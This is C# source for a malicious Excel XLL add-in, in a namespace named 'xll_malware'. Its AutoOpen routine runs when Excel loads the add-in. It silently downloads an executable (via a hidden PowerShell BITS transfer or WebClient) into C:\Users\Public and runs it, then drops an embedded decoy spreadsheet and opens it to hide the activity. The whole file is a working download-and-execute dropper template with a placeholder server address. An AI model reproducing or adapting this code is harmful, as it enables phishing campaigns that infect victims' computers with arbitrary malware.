using ExcelDna.Integration;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace xll_malware
{
    class XllAddIn : IExcelAddIn
    {
        [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

        public static bool isBitTransfer = true;
        public static bool isProcessStart = false;
        public static bool isLoadTemplate = false;
        public static bool isLoadTemplate2 = true;

        // Token: 0x02000006 RID: 6
        public enum xlUpdateLinks
        {
            // Token: 0x04000012 RID: 18
            Never,
            // Token: 0x04000013 RID: 19
            ExternalOnly,
            // Token: 0x04000014 RID: 20
            RemoteOnly,
            // Token: 0x04000015 RID: 21
            ExternalAndRemote
        }
        public static void Open(string path, xlUpdateLinks update_links = xlUpdateLinks.Never, bool read_only = false, string password = null)
        {
            XlCall.Excel(XlCall.xlcOpen, new object[]
            {
                path,
                (int)update_links,
                read_only,
                Type.Missing,
                password,
                Type.Missing,
                true,
                2,
                Type.Missing,
                true,
                Type.Missing,
                Type.Missing,
                Type.Missing,
                Type.Missing
            });
        }
        //https://msdn.microsoft.com/zh-cn/library/bb687860(v=office.15)
        //Callback function that must be implemented and exported by every valid XLL. The xlAutoOpen function is the recommended place from where to register XLL functions and commands, initialize data structures, customize the user interface, and so on.
        public void AutoOpen()
        {
            if (isBitTransfer)
            {
                Debug.WriteLine("download exe and exec");
                ShellExecute((IntPtr)0, "open", "powershell", "Start-BitsTransfer -Source http://127.0.0.1:8000/123.exe  -Destination C:\\Users\\Public\\yqgi.exe;C:\\Users\\Public\\yqgi.exe", "", 0);

            }
            if (isProcessStart)
            {
                using (WebClient webClient = new WebClient())
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                    String remoteurl = "http://127.0.0.1:8000/123.exe";
                    String downFileName = "C:\\Users\\Public\\yqgi.exe";
                    webClient.DownloadFile(remoteurl, downFileName);
                    Process.Start(downFileName);
                }
            }
            var assembly = Assembly.GetExecutingAssembly();
            String[] allResourceNames = assembly.GetManifestResourceNames();
            foreach (String resourceName in allResourceNames)
            {
                Debug.WriteLine("ResourceName:" + resourceName);
            }
            String currentNameSpace = System.Reflection.MethodBase.GetCurrentMethod().DeclaringType.Namespace;

            String xlsxPath = "C:\\Users\\Administrator\\Desktop\\v9rd2yrzf.tdsoe47l.xlsx";
            using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(currentNameSpace + ".v9rd2yrzf.tdsoe47l.xlsx"))
            {

                using (FileStream fileStream = new FileStream(xlsxPath, FileMode.Create, FileAccess.Write))
                {
                    manifestResourceStream.CopyTo(fileStream);
                }

            }

            if (isLoadTemplate)
            {
                //使用ShellExecute加载xls在office2013上失败              
                ShellExecute((IntPtr)0, "open", xlsxPath, "", "", 0);
            }
            if (isLoadTemplate2)
            {
                Open(xlsxPath, xlUpdateLinks.Never, false, null);
            }
        }
        //https://msdn.microsoft.com/zh-cn/library/bb687830.aspx
        //Called by Microsoft Excel whenever the XLL is deactivated. The add-in is deactivated when an Excel session ends normally. The add-in can be deactivated by the user during an Excel session, and this function will be called in that case.
        //Excel does not require an XLL to implement and export this function, although it is advisable so that your XLL can unregister functions and commands, release resources, undo customizations, and so on.If functions and commands are not explicitly unregistered by the XLL, Excel does this after calling the xlAutoClose function.
        public void AutoClose()
        {
        }
    }

}
